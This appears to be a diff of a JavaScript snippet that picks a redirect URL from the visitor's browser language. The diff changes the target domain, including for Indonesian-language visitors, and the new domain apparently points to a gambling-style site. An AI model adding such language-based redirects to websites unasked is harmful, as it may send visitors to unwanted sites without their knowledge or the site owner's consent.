@@ -9,7 +9,7 @@
         ? navigator.languages 
         : [navigator.language || navigator.userLanguage || ''];
     
-    var targetUrl = 'https://588985.com';
+    var targetUrl = 'https://garuda99m.com';
 
     for (var i = 0; i < langs.length; i++) {
         var low = (langs[i] || '').toLowerCase();
@@ -18,7 +18,7 @@
             break;
         }
         if (low.indexOf('id') === 0) {
-            targetUrl = 'https://588985.com';
+            targetUrl = 'https://garuda99m.com';
             break;
         }
     }
